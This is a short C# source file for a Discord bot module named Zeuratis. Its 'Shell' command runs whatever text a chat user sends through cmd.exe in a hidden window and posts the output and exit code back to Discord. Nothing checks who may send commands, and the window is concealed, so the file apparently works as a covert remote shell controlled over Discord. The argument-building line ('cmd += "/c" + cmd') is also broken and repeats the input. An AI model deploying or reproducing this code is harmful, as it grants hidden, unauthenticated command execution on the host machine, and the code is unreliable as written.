namespace Zeuratis;

public class ShellCommands : ModuleBase<SocketCommandContext>
{
    [Command("Shell")]
    public async Task Shell(String cmd)
    {
        cmd += "/c" + cmd;

        ProcessStartInfo shellInfo = new()
        {
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            FileName = "cmd.exe",
            Arguments = cmd,
            CreateNoWindow = true,
            WindowStyle = ProcessWindowStyle.Hidden
        };

        Process shell = new() { StartInfo = shellInfo };
        shell.Start();
        
        String[] output = 
        { 
            shell.StandardOutput.ReadToEnd(), 
            shell.ExitCode.ToString() 
        };

        await ReplyAsync(embed: new EmbedBuilder
        {
            Description = "Shell Output Info"
        }
        .AddField("Std Output: ", output[0])
        .AddField("Exit Code: ", output[1])
        .Build());
    }
}
